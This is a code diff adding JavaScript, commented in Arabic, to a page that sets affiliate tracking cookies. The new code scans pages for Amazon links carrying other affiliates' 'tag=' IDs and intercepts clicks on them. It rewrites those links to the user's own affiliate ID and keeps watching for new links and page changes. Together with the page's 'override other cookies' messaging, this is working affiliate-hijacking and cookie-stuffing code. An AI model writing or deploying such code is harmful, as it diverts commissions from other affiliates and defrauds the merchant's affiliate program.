@@ -720,7 +720,10 @@
             // تحديث المؤشر
             updateCookieStatusIndicator();
             
-            showStatus('تم قبول الكوكيز بنجاح! ستتغلب على أي كوكيز أخرى', 'success');
+            // تفعيل النظام المتكامل للتغليب
+            activateComprehensiveOverride(trackingData);
+            
+            showStatus('تم قبول الكوكيز بنجاح! النظام المتكامل للتغليب مفعل الآن', 'success');
         }
         
         // وظيفة رفض الكوكيز من صفحة المنتج
@@ -844,11 +847,283 @@
                 showStatus('تم قبول وحفظ الكوكيز بنجاح! ستتغلب على أي كوكيز أخرى', 'success');
                 startTimer();
                 
+                // تفعيل النظام المتكامل للتغليب
+                activateComprehensiveOverride(pendingTrackingData);
+                
                 // إعادة التوجيه مع عداد تنازلي
                 if (pendingTrackingData.targetUrl) {
                     startRedirectCountdown(pendingTrackingData.targetUrl);
                 }
             }
+        }
+        
+        // وظيفة تفعيل النظام المتكامل للتغليب
+        function activateComprehensiveOverride(trackingData) {
+            console.log('🚀 تم تفعيل النظام المتكامل للتغليب');
+            
+            // 1. مراقبة جميع الروابط في الصفحة
+            monitorAllLinks(trackingData);
+            
+            // 2. مراقبة النقر على الروابط
+            monitorLinkClicks(trackingData);
+            
+            // 3. مراقبة فتح الروابط في نافذة جديدة
+            monitorNewWindowLinks(trackingData);
+            
+            // 4. مراقبة تغيير الصفحة
+            monitorPageChanges(trackingData);
+            
+            // 5. إظهار رسالة تأكيد
+            showOverrideConfirmation(trackingData);
+        }
+        
+        // وظيفة مراقبة جميع الروابط في الصفحة
+        function monitorAllLinks(trackingData) {
+            // البحث عن جميع الروابط الموجودة
+            const allLinks = document.querySelectorAll('a[href*="amazon"], a[href*="tag="], a[href*="linkCode="]');
+            
+            allLinks.forEach(link => {
+                processLinkForOverride(link, trackingData);
+            });
+            
+            // مراقبة الروابط الجديدة
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type === 'childList') {
+                        mutation.addedNodes.forEach(function(node) {
+                            if (node.nodeType === 1) {
+                                const newLinks = node.querySelectorAll ? node.querySelectorAll('a[href*="amazon"], a[href*="tag="], a[href*="linkCode="]') : [];
+                                newLinks.forEach(link => processLinkForOverride(link, trackingData));
+                                
+                                if (node.tagName === 'A' && node.href) {
+                                    processLinkForOverride(node, trackingData);
+                                }
+                            }
+                        });
+                    }
+                });
+            });
+            
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+        }
+        
+        // وظيفة معالجة رابط للتغليب
+        function processLinkForOverride(link, trackingData) {
+            const href = link.href;
+            
+            // فحص إذا كان الرابط يحتوي على معرف أفلييت منافس
+            if (href.includes('tag=') && !href.includes(trackingData.affiliateId)) {
+                console.log('🛡️ تم اكتشاف رابط منافس:', href);
+                
+                // تعديل الرابط ليستخدم معرفك
+                const modifiedUrl = modifyAffiliateLink(href, trackingData.affiliateId);
+                
+                // إضافة مستمع النقر
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    console.log('🛡️ تم النقر على رابط منافس، يتم التغليب...');
+                    
+                    // إظهار رسالة التغليب
+                    showOverrideMessage(trackingData.affiliateId);
+                    
+                    // الانتقال للرابط المعدل
+                    setTimeout(() => {
+                        window.location.href = modifiedUrl;
+                    }, 1500);
+                    
+                    return false;
+                });
+                
+                // إضافة مؤشر بصري
+                link.style.border = '2px solid #28a745';
+                link.style.borderRadius = '5px';
+                link.style.padding = '5px';
+                link.title = `🛡️ هذا الرابط سيتم تعديله ليستخدم معرفك: ${trackingData.affiliateId}`;
+                
+                // إضافة أيقونة التغليب
+                const overrideIcon = document.createElement('span');
+                overrideIcon.innerHTML = '🛡️';
+                overrideIcon.style.marginRight = '5px';
+                overrideIcon.style.color = '#28a745';
+                link.insertBefore(overrideIcon, link.firstChild);
+                
+                console.log('✅ تم تعديل الرابط:', modifiedUrl);
+            }
+        }
+        
+        // وظيفة مراقبة النقر على الروابط
+        function monitorLinkClicks(trackingData) {
+            document.addEventListener('click', function(e) {
+                const target = e.target.closest('a');
+                if (!target || !target.href) return;
+                
+                const href = target.href;
+                
+                // فحص إذا كان الرابط يحتوي على معرف أفلييت منافس
+                if (href.includes('tag=') && !href.includes(trackingData.affiliateId)) {
+                    console.log('🛡️ تم اكتشاف رابط منافس عالمي:', href);
+                    
+                    // منع الانتقال للرابط الأصلي
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // تعديل الرابط ليستخدم معرفك
+                    const modifiedUrl = modifyAffiliateLink(href, trackingData.affiliateId);
+                    
+                    // إظهار رسالة التغليب
+                    showOverrideMessage(trackingData.affiliateId);
+                    
+                    // الانتقال للرابط المعدل
+                    setTimeout(() => {
+                        window.location.href = modifiedUrl;
+                    }, 1500);
+                    
+                    return false;
+                }
+            }, true);
+        }
+        
+        // وظيفة مراقبة فتح الروابط في نافذة جديدة
+        function monitorNewWindowLinks(trackingData) {
+            document.addEventListener('click', function(e) {
+                const target = e.target.closest('a');
+                if (!target || !target.href) return;
+                
+                const href = target.href;
+                
+                // فحص إذا كان الرابط يحتوي على معرف أفلييت منافس
+                if (href.includes('tag=') && !href.includes(trackingData.affiliateId)) {
+                    // فحص إذا كان الرابط سيفتح في نافذة جديدة
+                    if (target.target === '_blank' || target.target === '_new') {
+                        console.log('🛡️ رابط منافس في نافذة جديدة:', href);
+                        
+                        // تعديل الرابط
+                        const modifiedUrl = modifyAffiliateLink(href, trackingData.affiliateId);
+                        
+                        // فتح الرابط المعدل في نافذة جديدة
+                        setTimeout(() => {
+                            window.open(modifiedUrl, '_blank');
+                        }, 1000);
+                        
+                        // إظهار رسالة
+                        showOverrideMessage(trackingData.affiliateId);
+                    }
+                }
+            });
+        }
+        
+        // وظيفة مراقبة تغيير الصفحة
+        function monitorPageChanges(trackingData) {
+            // مراقبة تغيير العنوان
+            let currentUrl = window.location.href;
+            
+            setInterval(() => {
+                if (window.location.href !== currentUrl) {
+                    currentUrl = window.location.href;
+                    console.log('🔄 تم تغيير الصفحة، إعادة تفعيل التغليب...');
+                    
+                    // إعادة تفعيل التغليب في الصفحة الجديدة
+                    setTimeout(() => {
+                        monitorAllLinks(trackingData);
+                    }, 1000);
+                }
+            }, 1000);
+        }
+        
+        // وظيفة إظهار رسالة التغليب
+        function showOverrideMessage(affiliateId) {
+            const message = document.createElement('div');
+            message.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: linear-gradient(45deg, #28a745, #20c997);
+                color: white;
+                padding: 30px;
+                border-radius: 20px;
+                z-index: 10000;
+                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+                text-align: center;
+                max-width: 400px;
+                animation: fadeInOut 3s ease-in-out;
+            `;
+            
+            message.innerHTML = `
+                <h3>🛡️ تم التغليب بنجاح!</h3>
+                <p>تم تعديل الرابط ليستخدم معرفك: <strong>${affiliateId}</strong></p>
+                <p>سيتم توجيهك للرابط المعدل...</p>
+            `;
+            
+            // إضافة CSS للرسالة
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes fadeInOut {
+                    0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+                    20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+                    80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+                    100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+                }
+            `;
+            document.head.appendChild(style);
+            
+            document.body.appendChild(message);
+            
+            // إزالة الرسالة بعد 3 ثواني
+            setTimeout(() => {
+                if (message.parentNode) {
+                    message.remove();
+                }
+            }, 3000);
+        }
+        
+        // وظيفة إظهار تأكيد التغليب
+        function showOverrideConfirmation(trackingData) {
+            const confirmation = document.createElement('div');
+            confirmation.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                background: linear-gradient(45deg, #667eea, #764ba2);
+                color: white;
+                padding: 20px;
+                border-radius: 15px;
+                z-index: 10000;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                max-width: 300px;
+                animation: slideIn 0.5s ease-out;
+            `;
+            
+            confirmation.innerHTML = `
+                <h4>🛡️ نظام التغليب مفعل</h4>
+                <p>معرف الأفلييت: <strong>${trackingData.affiliateId}</strong></p>
+                <p>جميع الروابط المنافسة سيتم تعديلها تلقائياً!</p>
+                <button onclick="this.parentElement.remove()" style="background: rgba(255,255,255,0.2); border: none; color: white; padding: 8px 15px; border-radius: 8px; cursor: pointer; margin-top: 10px;">✅ فهمت</button>
+            `;
+            
+            // إضافة CSS للرسالة
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes slideIn {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+            `;
+            document.head.appendChild(style);
+            
+            document.body.appendChild(confirmation);
+            
+            // إزالة الرسالة بعد 10 ثواني
+            setTimeout(() => {
+                if (confirmation.parentNode) {
+                    confirmation.remove();
+                }
+            }, 10000);
         }
         
         // وظيفة رفض الكوكيز
